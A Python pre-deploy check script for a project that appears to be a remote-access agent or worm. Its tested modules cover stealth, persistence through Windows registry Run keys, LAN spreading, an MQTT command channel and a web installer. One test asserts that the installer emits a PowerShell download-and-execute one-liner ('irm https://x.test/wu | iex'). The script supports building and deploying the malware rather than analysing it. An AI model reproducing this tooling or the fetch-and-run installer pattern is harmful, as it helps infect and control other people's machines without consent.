#!/usr/bin/env python3
"""Fail fast if the tree is not installable.  Run in CI and before every deploy."""
import importlib, os, sys, tempfile, zipfile

ROOT = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
sys.path.insert(0, ROOT)
FAILS = []

def check(name, fn):
    try:
        fn(); print(f"  OK   {name}")
    except Exception as e:
        FAILS.append(f"{name}: {e}"); print(f"  FAIL {name}: {e}")

def imports():
    for mod in ("syspy.config", "syspy.crypto", "syspy.protocol", "syspy.mqtt",
                "syspy.httpd", "syspy.ws", "syspy.guardian", "syspy.packaging",
                "syspy.agent.core", "syspy.agent.commands", "syspy.agent.persistence",
                "syspy.agent.stealth", "syspy.agent.updater", "syspy.agent.runtime",
                "syspy.agent.health", "syspy.lan.beacon", "syspy.lan.discover",
                "syspy.lan.spread", "syspy.server.api", "syspy.server.hub",
                "syspy.server.webinstall", "syspy.server.runtime_cache", "bootstrap"):
        importlib.import_module(mod)

def config_surface():
    from syspy import config as c
    for name in ("topic_up", "topic_down", "broker_order", "agent_id", "mac",
                 "subnet", "hop", "parent_id", "hostname", "os_kind",
                 "runtime_python", "IS_WINDOWS", "ROOT", "PUBLIC_URL",
                 "LAN_ENABLED", "SPREAD_ENABLED", "HOP_LIMIT", "protected"):
        assert hasattr(c, name), f"config.{name} missing"
    assert c.topic_up("x").endswith("/up/x")
    assert c.topic_down("x").endswith("/down/x")
    assert c.broker_order()

def registry_path():
    from syspy import guardian
    for key in guardian._APPROVED_SUBKEYS:
        assert "Microsoft\\Windows\\CurrentVersion\\Explorer" in key, key

def persistence_surface():
    from syspy.agent import persistence
    for name in ("_write_shim", "_write_anchor", "_cache_kit", "_reassert_run_keys",
                 "_run_commands", "_shim_source", "ensure", "install", "remove", "purge"):
        assert hasattr(persistence, name), f"persistence.{name} missing"

def zip_is_complete():
    from syspy import packaging
    blob = packaging.build_zip(ROOT, extra={"deploy.json": b"{}"})
    with zipfile.ZipFile(__import__("io").BytesIO(blob)) as z:
        names = set(z.namelist())
    for need in ("agent.py", "bootstrap.py", "install/i.ps1", "install/wu.cmd",
                 "syspy/config.py", "deploy.json"):
        assert need in names, f"kit missing {need}"

def arg_splitter():
    from syspy.agent.commands import _split_args
    assert _split_args(r'"C:\a b\x.txt" "q r"') == [r"C:\a b\x.txt", "q r"]

def one_liner():
    from syspy.server import webinstall
    line = webinstall.one_liner("https://x.test")
    assert "irm https://x.test/wu | iex" in line
    body = webinstall.render(base="https://x.test")
    for token in ("@@BASE@@", "@@ROOM@@", "@@SALT@@", "@@PROTECT@@"):
        assert token not in body, token
    assert "py.zip" in body and "Is64BitOperatingSystem" in body

for name, fn in (("imports", imports), ("config surface", config_surface),
                 ("guardian registry path", registry_path),
                 ("persistence surface", persistence_surface),
                 ("kit completeness", zip_is_complete),
                 ("argument splitter", arg_splitter), ("one-liner", one_liner)):
    check(name, fn)

print()
if FAILS:
    print(f"{len(FAILS)} FAILURE(S)"); sys.exit(1)
print("preflight OK")
